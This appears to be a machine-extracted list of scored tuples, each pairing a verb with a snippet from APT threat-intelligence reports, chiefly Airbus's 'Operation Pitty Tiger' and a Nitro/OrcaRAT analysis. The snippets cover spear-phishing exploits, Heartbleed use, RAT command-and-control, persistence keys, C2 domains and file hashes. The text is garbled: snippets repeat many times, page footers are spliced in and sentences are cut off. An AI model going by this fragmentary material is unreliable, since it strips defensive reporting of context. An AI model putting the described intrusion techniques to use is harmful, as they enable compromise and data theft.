Non-governmental organizations (NGOs)\n</list>\nThe proven ability to successfully deploy a number of different private and public RATs using zero-day\nexploits against high-profile targets likely indicates that')(0.6666666666666666, 'build', '\n\x0cThey build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have\nsome identical functions with common typos, and even share the same name')(0.8333333333333334, 'downloads', '\n</section>\n<section>\n<heading>Shellcode analysis</heading>\n\nSubsequently, the malicious Flash code downloads a file containing the dropped malware payload')(0.7777777777777778, 'designed', '\n\nGiven the information above we can reasonably assume that this malware was most likely designed as a\nfirst stage implant')(0.8, 'written', ' Once the payload text has been decrypted the malware treats this as a binary executable\nfile, which is then written to the disk and executed')(0.8666666666666667, 'force', ' The first set of commands force the malware to behave\nas a simple downloader')(1.0, 'executing', '\n<figure></figure>\n\n\x0c(A screenshot showing the structure of the command and control routines within OrcaRAT)\n\nThe command and control structure is fairly simplistic but provides the operator with access to the victim\nmachine’s filesystem and command line, and as such allows the attacker to perform various tasks such as\nexecuting arbitrary commands or uploading and downloading files from the compromised system')(0.8, 'provides', '\n<figure></figure>\n\n\x0c(A screenshot showing the structure of the command and control routines within OrcaRAT)\n\nThe command and control structure is fairly simplistic but provides the operator with access to the victim\nmachine’s filesystem and command line, and as such allows the attacker to perform various tasks such as\nexecuting arbitrary commands or uploading and downloading files from the compromised system')(0.42857142857142855, 'downloading', '\n<figure></figure>\n\n\x0c(A screenshot showing the structure of the command and control routines within OrcaRAT)\n\nThe command and control structure is fairly simplistic but provides the operator with access to the victim\nmachine’s filesystem and command line, and as such allows the attacker to perform various tasks such as\nexecuting arbitrary commands or uploading and downloading files from the compromised system')(0.375, 'uploading', '\n<figure></figure>\n\n\x0c(A screenshot showing the structure of the command and control routines within OrcaRAT)\n\nThe command and control structure is fairly simplistic but provides the operator with access to the victim\nmachine’s filesystem and command line, and as such allows the attacker to perform various tasks such as\nexecuting arbitrary commands or uploading and downloading files from the compromised system')(0.7857142857142857, 'sends', '\n\nAfter a command and control message is received, OrcaRAT sends an HTTP POST message back to the\ncommand and control server')(0.125, 'avoid', '\n\nTable 7\n<table>\n SHA256         ffbddfb536e8e604c880ec977d06f804a500fc0396899bd2c195fb1f5b74207a\n MD5            a3b2e34973691ad320b70248bd67fbd2\n File Name      CitrixReceiverWeb.exe\n File Size      192512\n First Seen     2014-03-12 06:58:22\n C2 URL         zip.redirectme[.]net\n Resolution     196.45.144.12\n</table>\nAs this post and previous cited research show, APT groups such as Nitro will continue to evolve their\ntechniques within the kill chain to avoid detection')(0.5555555555555556, 'use', '\n\nTable 4\n<table>\n SHA256        e7f2af8c48f837da57000c068368d77bc9b06eba1e077edfab58df6aa2ea40ec\n MD5           271e6a4d45c2817f86148ca413f97604\n File Name     mdm.exe\n File Size     118784\n First Seen    2014-05-20 08:43:15\n C2 URL        zipoo.redirectme[.]net\n Resolution    196.45.144.12\n</table>\nTable 5\n<table>\n SHA256         e601da16f923b33465dbafbff9d47195e8fc50099fd0581a16a1745bf890afb6\n MD5            be765cd5723e4366d35172aaf13fad44\n File Name      CitrixReceiverWeb.exe\n File Size      135168\n First Seen     2014-05-15 16:34:10\n C2 URL         zipoo.redirectme[.]net\n Resolution     196.45.144.12\n</table>\nThe malware dropped was configured to use good.myftp[.]org as the C2 URL, and the IP resolution was\n223.25.233.248')(0.4444444444444444, 'sending', '\n\n    Once this data has been transferred to the c&c server, it responds by sending additional malware to\n    execute on the machine')(0.7333333333333333, 'collected', '\n\n    We have also been able to testify that the Pitty Tiger group has successfully collected information on\n    some of their targets by exploiting the HeartBleed<fn>1</fn> bug')(0.6666666666666666, 'establish', ' The\n    attackers have everything they need to start looking for an entry point to the company’s network and\n    establish one or several permanent backdoors into the environment')(0.5555555555555556, 'launched', '\n\n    We also found a lot of vulnerability scanners launched by the attackers at different targets, yet there\n    was no sign of compromise')(1.0, 'collect', '\n\n\n<figure></figure>\n\n                      <caption>Memory data leak from one server – Heartbleed exploit on one of PittyTiger’s targets</caption>\n\n\n\n<footnote>\n    1\n        http://heartbleed.com/\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 10/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n    Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or\n    on several domains is a very noisy way to collect information and find server vulnerabilities')(0.25, 'Running', '\n\n\n<figure></figure>\n\n                      <caption>Memory data leak from one server – Heartbleed exploit on one of PittyTiger’s targets</caption>\n\n\n\n<footnote>\n    1\n        http://heartbleed.com/\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 10/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n    Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or\n    on several domains is a very noisy way to collect information and find server vulnerabilities')(0.5, 'find', '\n\n\n<figure></figure>\n\n                      <caption>Memory data leak from one server – Heartbleed exploit on one of PittyTiger’s targets</caption>\n\n\n\n<footnote>\n    1\n        http://heartbleed.com/\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 10/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n    Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or\n    on several domains is a very noisy way to collect information and find server vulnerabilities')(0.3333333333333333, 'retrieve', ' A Hello packet is then sent:\n\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 24/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n<figure></figure>\n\n\n                                 <caption>Hello packet sent by Troj/Goldsun-B to its c&c server</caption>\n\n    The bot then repeatedly sends GET requests on “/httpdocs/mm/<bot_id>/ComMand.sec” to retrieve\n    remote commands')(0.4444444444444444, 'launch', '\n\n    They are quite unprofessional in their way of using their infrastructure: they do launch vulnerability\n    scanners directly from a c&c server and also use their connection for personal activities\n    (downloading pornographic material for example, as we have seen a whole folder on a c&c server\n    full of xxx torrent links)')(0.5, 'inject', '\n</section>\n<section>\n    <heading>Installation</heading>\n\n    Unsurprisingly, when running in our sandbox, the RAT triggers the same alarms as PittyTiger:\n\n<figure></figure>\n\n\n                                <caption>Alarms in our sandbox system, triggered by the CT RAT</caption>\n\n\n\n    The binary drops two files in “C:\\Program Files\\Internet Explorer”:\n\n\n<footnote>\n\n    1\n        MD5 hash: f65dc0b3eeb3c393e89ab49a3fac95a8\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 19/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<figure></figure>\n                                      <caption>Files dropped by the CT RAT in our sandbox</caption>\n\n    The “ieupdate.exe” is a simple binary to inject the DLL into “explorer.exe”')(0.8571428571428571, 'gained', '\n\n</section>\n<section>\n\n          <heading>ACCESS STRENGTHENING & LATERAL MOVES</heading>\n\n    Attackers have gained access to one or several machines inside the target’s corporate network')(0.5, 'connected', '\n\n    A computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5')(0.25, 'launched', '\n\n\n</section>\n<section>\n            <heading>DIRECT ATTACKS</heading>\n    Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on\n    the group’s targets servers, we have been able to record several vulnerability scanning launched\n    from one c&c server straight to the targets')(0.8, 'get', ' It allowed the Pitty Tiger group to get admin credentials from at least one target, for\n    example')(0.5, 'use', '\n\n</section>\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 11/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<section>\n<heading>\n    MALWARE INFORMATION\n</heading>\n</section>\n<section>\n          <heading>TROJ/REROL.A</heading>\n    One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office\n    Word document which exploits a specific vulnerability')(0.05263157894736842, 'is', ' The variants we have seen did use that same User-\n    Agent:\n<list>\n                      Mozilla/4.0 (compatible;)\n</list>\n\n    The persistence mechanism used by the malware is the creation of a registry key named “Shell”\n    containing the path to the malware on the infected system:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name : Shell\n              Value : explorer.exe,C:\\DOCUME~1\\XXXXXX\\APPLIC~1\\svohost.exe,\n</list>\n\n    The payload of this malware is used to collect information on the newly infected host, and send it\n    back to the c&c server')(0.25, 'used', ' The variants we have seen did use that same User-\n    Agent:\n<list>\n                      Mozilla/4.0 (compatible;)\n</list>\n\n    The persistence mechanism used by the malware is the creation of a registry key named “Shell”\n    containing the path to the malware on the infected system:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name : Shell\n              Value : explorer.exe,C:\\DOCUME~1\\XXXXXX\\APPLIC~1\\svohost.exe,\n</list>\n\n    The payload of this malware is used to collect information on the newly infected host, and send it\n    back to the c&c server')(0.46153846153846156, 'send', ' The variants we have seen did use that same User-\n    Agent:\n<list>\n                      Mozilla/4.0 (compatible;)\n</list>\n\n    The persistence mechanism used by the malware is the creation of a registry key named “Shell”\n    containing the path to the malware on the infected system:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name : Shell\n              Value : explorer.exe,C:\\DOCUME~1\\XXXXXX\\APPLIC~1\\svohost.exe,\n</list>\n\n    The payload of this malware is used to collect information on the newly infected host, and send it\n    back to the c&c server')(0.8125, 'is used', ' The variants we have seen did use that same User-\n    Agent:\n<list>\n                      Mozilla/4.0 (compatible;)\n</list>\n\n    The persistence mechanism used by the malware is the creation of a registry key named “Shell”\n    containing the path to the malware on the infected system:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name : Shell\n              Value : explorer.exe,C:\\DOCUME~1\\XXXXXX\\APPLIC~1\\svohost.exe,\n</list>\n\n    The payload of this malware is used to collect information on the newly infected host, and send it\n    back to the c&c server')(0.6666666666666666, 'crafted', '\n\n    We have been able to find a spear phishing e-mail crafted by the attackers')(0.25, 'write', '\n\n    Please note that at this point, the attacker has at least the privileges of a local administrator, since\n    he is allowed to write content in the system32 folder of a Windows XP system')(1.0, 'has', '\n\n    Please note that at this point, the attacker has at least the privileges of a local administrator, since\n    he is allowed to write content in the system32 folder of a Windows XP system')(1.0, 'sent', ' After being injected, it starts sending its Hello\n    packet to its c&c server:\n\n\n\n<figure></figure>\n                                     <caption>Sample communication from PittyTiger RAT</caption>\n\n\n</section>\n\n \n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 17/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<section>\n    <heading>Command & Control</heading>\n\n    All the requests sent to the c&c contains the string “/FC001/” followed by the bot id')(0.875, 'sending', ' After being injected, it starts sending its Hello\n    packet to its c&c server:\n\n\n\n<figure></figure>\n                                     <caption>Sample communication from PittyTiger RAT</caption>\n\n\n</section>\n\n \n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 17/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<section>\n    <heading>Command & Control</heading>\n\n    All the requests sent to the c&c contains the string “/FC001/” followed by the bot id')(1.0, 'connect', '\n\n    Moreover, the built malware we found in the same folder was configured to connect to a local IP\n    address, probably for testing purposes')(0.42857142857142855, 'collect', ' This one is also used by the group to infect\n    workstations, collect system information, and install more malware on the infected computer')(0.8, 'install', ' This one is also used by the group to infect\n    workstations, collect system information, and install more malware on the infected computer')(0.3333333333333333, 'infect', ' This one is also used by the group to infect\n    workstations, collect system information, and install more malware on the infected computer')(0.39473684210526316, 'looking', '\n\n    As soon as the attackers are sure they have enough access, they start looking for two things:\n    intellectual property (or anything else they want to know or steal) in alignment with predefined\n    mission objectives, and a means of privilege escalation to facilitate lateral movement within the\n    compromised environment')(1.0, 'conducted', '\n    Remember to look down!\n\n\n    XXXXXX\n</figure>\n\n    The attached file is a Microsoft Office Word document triggering CVE-2014-1761 to infect the\n    computer it is sent to:\n\n\n\n<figure></figure>\n                          <caption>Word document used to infect computers with Troj/ReRol.A</caption>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 9/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n    While this example looks very “amateur” for a spear phishing attempt, we suppose the group has\n    conducted more advanced spear phishing campaigns, based on the fact that we found infected\n    Word documents showing content stolen from victims of the group')(0.75, 'stolen', '\n    Remember to look down!\n\n\n    XXXXXX\n</figure>\n\n    The attached file is a Microsoft Office Word document triggering CVE-2014-1761 to infect the\n    computer it is sent to:\n\n\n\n<figure></figure>\n                          <caption>Word document used to infect computers with Troj/ReRol.A</caption>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 9/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n    While this example looks very “amateur” for a spear phishing attempt, we suppose the group has\n    conducted more advanced spear phishing campaigns, based on the fact that we found infected\n    Word documents showing content stolen from victims of the group')(1.0, 'is', '\n\n</section>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 6/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<section>\n            <heading>DATA EXFILTRATION</heading>\n\n    Data exfiltration is the last step before the attackers loop to the lateral moves step, in a never-ending\n    circle of prolonged access and information theft')(0.6666666666666666, 'resolving', '\n    These addresses are listed below:\n<list>\n        -   63.251.83.36\n        -   64.74.96.242\n        -   69.251.142.1\n        -   212.118.243.118\n        -   216.52.184.230\n        -   61.145.112.78\n        -   218.16.121.32\n</list>\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    It starts resolving its domains after injection, and immediately sends requests')(0.5, 'sends', '\n    These addresses are listed below:\n<list>\n        -   63.251.83.36\n        -   64.74.96.242\n        -   69.251.142.1\n        -   212.118.243.118\n        -   216.52.184.230\n        -   61.145.112.78\n        -   218.16.121.32\n</list>\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    It starts resolving its domains after injection, and immediately sends requests')(0.8947368421052632, 'use', '\n\n\n\n<footnote>\n    1\n     http://nakedsecurity.sophos.com/2012/08/03/poisoned-doc-targeted-malware-attack/\n    2\n     http://nakedsecurity.sophos.com/2010/06/24/targeted-trident-cyberattack-defence-company/\n</footnote>\n</section>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 8/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n<section>\n<heading>\n    INFECTION METHODS\n</heading>\n</section>\n<section>\n          <heading>SPEAR PHISHING AND WEAPONIZED DOCUMENTS</heading>\n\n    Pitty Tiger, like most other APT groups, use spear phishing e-mails extensively in order to gain an\n    initial foothold within the targeted environment')(0.25925925925925924, 'acts', ' It acts\n    as a first stage downloader and system data collector often used in the initial compromise of the\n    Pitty Tiger campaigns, generally embedded in Microsoft Office documents')(0.5714285714285714, 'embedded', ' It acts\n    as a first stage downloader and system data collector often used in the initial compromise of the\n    Pitty Tiger campaigns, generally embedded in Microsoft Office documents')(0.6, 'spreading', '\n\n    We discovered several different documents spreading this malware by triggering CVE-2012-0158\n    vulnerability, yet we could not share them in this report, since these documents contain information\n    about victims of the Pitty Tiger group')(0.4444444444444444, 'represents', ' In POST commands, the CGI name represents the command')(0.6363636363636364, 'come', ' The controllers for these RATs show Chinese language;\n        \uf0b7   Several binaries used by the attackers show either “Chinese - China” or “Chinese-Taiwan”\n            language ID in their resources;\n        \uf0b7   A decoy Word document has been found, written in Chinese language;\n</list>\n    The IP addresses used for the hosting of the c&c domains are mainly located in Taipei (Taïwan) and\n    Hong Kong City (Hong Kong Special Administrative Region, PRC):\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 53/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<figure></figure>\n\n\n                          <caption>Hosting information links for the c&c servers used in this campaign</caption>\n\n\n\n    Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing (Fujian\n    province, PRC)')(0.14285714285714285, 'used', ' The controllers for these RATs show Chinese language;\n        \uf0b7   Several binaries used by the attackers show either “Chinese - China” or “Chinese-Taiwan”\n            language ID in their resources;\n        \uf0b7   A decoy Word document has been found, written in Chinese language;\n</list>\n    The IP addresses used for the hosting of the c&c domains are mainly located in Taipei (Taïwan) and\n    Hong Kong City (Hong Kong Special Administrative Region, PRC):\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 53/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<figure></figure>\n\n\n                          <caption>Hosting information links for the c&c servers used in this campaign</caption>\n\n\n\n    Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing (Fujian\n    province, PRC)')(0.625, 'send', ' Furthermore, no authentication is required to send\n    commands to the c&c (but you need to know the configured password to interact with the bots)')(1.0, 'initiates', ' It immediately triggers\n    alarms on our sandbox:\n\n\n\n<figure></figure>\n                            <caption>Alarms in our sandbox system, triggered by the Troj/ReRol.A malware</caption>\n\n\n\n    The binary drops a copy of itself in the Application Data folder of the currently logged-in user:\n\n\n<figure></figure>\n\n                          <caption>Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox</caption>\n\n\n\n    The malware initiates a communication to time.windows.com to check for connectivity, and then\n    communicates with the c&c server at mac.avstore.com.tw')(0.5, 'communicates', ' It immediately triggers\n    alarms on our sandbox:\n\n\n\n<figure></figure>\n                            <caption>Alarms in our sandbox system, triggered by the Troj/ReRol.A malware</caption>\n\n\n\n    The binary drops a copy of itself in the Application Data folder of the currently logged-in user:\n\n\n<figure></figure>\n\n                          <caption>Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox</caption>\n\n\n\n    The malware initiates a communication to time.windows.com to check for connectivity, and then\n    communicates with the c&c server at mac.avstore.com.tw')(0.6, 'check', ' It immediately triggers\n    alarms on our sandbox:\n\n\n\n<figure></figure>\n                            <caption>Alarms in our sandbox system, triggered by the Troj/ReRol.A malware</caption>\n\n\n\n    The binary drops a copy of itself in the Application Data folder of the currently logged-in user:\n\n\n<figure></figure>\n\n                          <caption>Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox</caption>\n\n\n\n    The malware initiates a communication to time.windows.com to check for connectivity, and then\n    communicates with the c&c server at mac.avstore.com.tw')(0.375, 'controlling', ' Not only is it one more indicator of a probable Chinese origin, but also an\n    indicator that this server was probably used as a test base, in addition to being operational and\n    controlling infected machines from different targets')(0.7272727272727273, 'used', '\n\n    Thanks to server’s misconfigurations, we managed to get information from three c&c servers used\n    by this group of attackers, which provided us with insight from the end of 2013 to the beginning of\n    July 2014')(0.2962962962962963, 'rely', '\n\n    The attackers mostly rely on two techniques here to infect one or several computers, usually\n    workstations, inside the target’s network: spear phishing and drive-by downloads')(0.5555555555555556, 'dump', ' It generally does not take long before the attackers gain domain\n    administrator privileges and dump all the Active Directory content')(1.0, 'gain', ' It generally does not take long before the attackers gain domain\n    administrator privileges and dump all the Active Directory content')(0.6666666666666666, 'receive', '\n\n    The RAT can then receive commands from its c&c')(0.5555555555555556, 'use', '\n\n    Some groups of attackers also use “watering hole” techniques to successfully compromise their\n    targets')(0.5, 'stealing', ' The attackers loop to the access strengthening/lateral\n    moves stage and generally keep stealing more information and stay inside the network for more\n    data gathering')(0.2857142857142857, 'stay', ' The attackers loop to the access strengthening/lateral\n    moves stage and generally keep stealing more information and stay inside the network for more\n    data gathering')(0.7777777777777778, 'uses', ' We do not\n    currently know why this malware uses the same patterns to communicate')(0.8, 'registered', ' The following alarms are\n    triggered in the sandbox:\n\n\n<figure></figure>\n\n                               <caption>Alarms in our sandbox system, triggered by the Paladin RAT</caption>\n\n    The shellcode contained in the Word file drops the following file, and executes it:\n<list>\n       - C:\\Documents and Settings\\<User>\\Local Settings\\Temp\\svohost.exe<fn>2</fn>\n</list>\n    This one drops in turn the following file:\n\n\n<footnote>\n\n    1\n        http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf\n    2\n        MD5 hash: 0567fd7484efbae502cac279d32ed518\n        </footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 26/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n<figure></figure>\n                                      <caption>File dropped by the malware in our sandbox</caption>\n\n    This tmp file is then copied to “C:\\Windows\\system32\\Nwsapagentex.dll” and registered as a service\n    called “Nwsapagent”')(0.3333333333333333, 'contains', '\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 20/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n\n    The Login packet contains the following string, after decoding and deciphering:\n<figure>\n               Login\n               ->C:PC-XXX\n               ->U:User-XXX\n               ->L:10.10.10.1\n               ->S:Microsoft Windows XP Service Pack 3 5.1 2600\n               ->M:Nov 13 2013\n               ->P:1033\n</figure>\n\n    It contains the computer name, the user name, the internal IP address, the OS version, the RAT\n    internal version and the Language ID of the system')(0.6, 'drops', ' It drops the “packet64.dll”, and\n    injects it in “explorer.exe”')(1.0, 'provide', ' The trick\n    is to target the right victim and provide it with the right content, so that they will click on a link leading\n    to drive-by download of a malware, or open an attached file which will infect their computer')(1.0, 'target', ' The trick\n    is to target the right victim and provide it with the right content, so that they will click on a link leading\n    to drive-by download of a malware, or open an attached file which will infect their computer')(0.8181818181818182, 'open', ' The trick\n    is to target the right victim and provide it with the right content, so that they will click on a link leading\n    to drive-by download of a malware, or open an attached file which will infect their computer')(0.8333333333333334, 'click', ' The trick\n    is to target the right victim and provide it with the right content, so that they will click on a link leading\n    to drive-by download of a malware, or open an attached file which will infect their computer')(0.36363636363636365, 'create', '\n\n    They generally create archive files containing the content they want to exfiltrate, which are then sent\n    to the attackers by using a remote administration tool (RAT) or transfer protocols such as FTP and\n    HTTP')(0.7777777777777778, 'compromise', ' It just takes a few lines of code in the infecting script\n    to only compromise visitors coming from the target IP ranges')(1.0, 'use', '\n\n    Pitty Tiger also seem to use fake Microsoft Office Excel content, yet we could only find empty\n    content delivering once again the Troj/ReRol.A malware')(0.038461538461538464, 'used', '\n\n<figure></figure>\n\n\n                              <caption>IP addresses used by the 50PZ80C-1DFDCB8 machine</caption>\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 42/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n\n    The two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to\n    connect to the c&c, yet some of these IP addresses come from the same IP range:\n\n<figure></figure>\n\n\n                          <caption>IP ranges overlapping between two machines used by the attackers</caption>\n\n    We mapped these RDP connections to have a graphical view:\n\n\n\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 43/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<figure></figure>\n                                     <caption>RDP connections from the attackers to one c&c server</caption>\n\n</section>\n<section>\n          <heading>“TOOT”</heading>\n\n    We found that a member of this group of attackers used some tools on his own system, for testing\n    purposes')(0.6, 'dropping', '\n\n    Interestingly enough, we saw a part of these documents appear on Virus-Total, with an additional\n    “gift” from the attackers, a payload dropping a malware')(0.2, 'send', '\n    The communication protocol is quite simple: GET requests are used to receive data from the c&c,\n    and POST requests to send data')(0.23076923076923078, 'shows', '\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 14/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n\n    Here is an anonymized sample of communication showing information collected by the malware:\n<figure>\n              HostName :xxx\n              UserName :xxx\n              SysType :32bit\n\n              Windows 7 Enterprise Service Pack 1 6.1 7601\n              Organization:\n              Owner:xxx\n\n              --------------Server Info-------------------\n              - AdobeARMservice\n              - Adobe Acrobat Update Service\n              - AeLookupSvc\n              - Application Experience\n              - AudioEndpointBuilder\n              - … (list goes on)\n\n              --------------Soft Info-------------------\n                     1   Adobe AIR 4.0.0.1390\n                     2   Adobe Shockwave Player 12.0 12.0.9.149\n                     3   FileZilla Client 3.7.4.1 3.7.4.1\n                     4   Mozilla Thunderbird 24.3.0 (x86 en-US) 24.3.0\n                     5   … (list goes on)\n\n\n              --------------IP Config-------------------\n              Adapt Type: Ethernet\n              NetCardNum:       11\n              NetCard Name:     {XXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\n              Description :     Realtek RTL8139C+ Fast Ethernet NIC\n              MAC-ADDR:         XX-XX-XX-XX-XX-XXX\n              IP-Addr:          10.xxx.xxx.xxx\n              IP-Mask:          255.255.255.0\n              GateWay:          10.xxx.xxx.xxx\n              DHCP Serv:        1\n              DHCP Host:        10.xxx.xxx.xxx\n              WINS Serv:        0\n              WINS PriHost:\n              WINS SecHost:\n</figure>\n                                 <caption>Sample information collected by Troj/ReRol.A malware</caption>\n\n\n    This information is very useful for an attacker: it shows all software installed on the system, and\n    running services')(0.8181818181818182, 'collect', ' This vulnerability which exists on some old\n    versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted\n    machine')(0.8181818181818182, 'uses', '\n\n    Our sample uses “mca.avstore.com.tw”, “star.yamn.net” and “bz.kimoo.com.tw” as c&c servers')(0.5, 'send', ' In a spear phishing scheme, attackers\n    send very few e-mails to targeted people')(0.8, 'gain', ' He could also gain\n    the credentials to a sensitive e-mail account')(0.7272727272727273, 'used', ' This is another remote administration\n    tool often used by the Pitty Tiger crew')(0.35714285714285715, 'install', '\n    They need to install several different backdoors in order to be able to always access the network')(0.07407407407407407, 'exploiting', '\n</section>\n<section>\n    <heading>Exploitation</heading>\n\n    We have been able to find one such document<fn>1</fn> used by that group of attacker, exploiting CVE-\n    2012-0158, an old critical vulnerability impacting Microsoft Office and corrected by Microsoft’s\n    MS12-027 fix in April 2012')(0.9090909090909091, 'is', '\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The malware<fn>1</fn>, when running in our sandbox, triggers the following alarms:\n\n<figure></figure>\n\n\n                           <caption>Alarms in our sandbox system, triggered by the PittyTiger malware</caption>\n\n\n\n    The binary drops two files in “C:\\Windows\\System32”:\n\n\n<footnote>\n    1\n        MD5 hash : be18418cafdb9f86303f7e419a389cc9\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 16/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n\n<figure></figure>\n\n                                 <caption>Files dropped by the PittyTiger RAT in our sandbox</caption>\n\n    The “qmgrxp.exe” binary is a simple copy of the original binary')(0.7142857142857143, 'infect', '\n\n    Pitty Tiger is effective and mature in the use of targeted malware, the use of known exploits to infect\n    computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks')(0.6774193548387096, 'compromise', ' To build a watering hole attack, attackers do compromise the website of a third party,\n    generally a supplier of the target, which is typically visited by a specific group of professionals and\n    very likely by the target')(0.5714285714285714, 'executing', '\n\n    He launched some tests with the CT RAT we exposed earlier:\n\n\n<figure></figure>\n\n                          <caption>User “Toot” logging on the CT RAT on machine “toot-2a601225a8”, 2014/02/10</caption>\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 “The Eye of the Tiger”                         Page : 44/58\n\n                               Copyright © 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\x0cOperation Pitty Tiger – “The Eye of the Tiger”</header>\n\n<figure></figure>\n\n\n                          <caption>User “Toot” logging on the CT RAT on machine “toot-2a601225a8”, 2014/04/09</caption>\n\n<figure></figure>\n\n\n\n                          <caption>User “Toot” logging on the CT RAT on machine “toot-2a601225a8”, 2014/04/09</caption>\n\n\n\n    Here we can see a user 